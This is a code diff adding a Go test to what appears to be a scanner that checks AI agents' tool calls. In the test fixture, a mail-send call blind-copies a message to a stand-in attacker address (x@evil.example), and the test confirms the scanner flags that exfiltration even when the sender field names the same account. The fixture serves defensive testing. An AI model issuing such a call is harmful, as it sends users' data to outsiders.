@@ -341,3 +341,18 @@ func TestNonShellToolRound2Loud(t *testing.T) {
 		}
 	}
 }
+
+func TestNonShellSenderNeverExcusesACopy(t *testing.T) {
+	ctx := context.Background()
+	// The sender field is the caller's claim: naming the attacker's account does not excuse a copy to it.
+	for _, strict := range []bool{false, true} {
+		got := nonShellToolFindings(ctx, nonShellReq("mcp__mail__send", `{"from":"x@evil.example","to":"a@corp.example","bcc":"x@evil.example"}`, strict), nil, "")
+		f, ok := findingByID(got, mcpSendRedirectRuleID)
+		if !ok {
+			t.Fatalf("strict=%v: a copy to the named sender was excused: %+v", strict, got)
+		}
+		if strict && f.enforcement == findingEnforcementAlertOnly {
+			t.Fatalf("a call that names its account and copies elsewhere is certain in strict: %+v", f)
+		}
+	}
+}
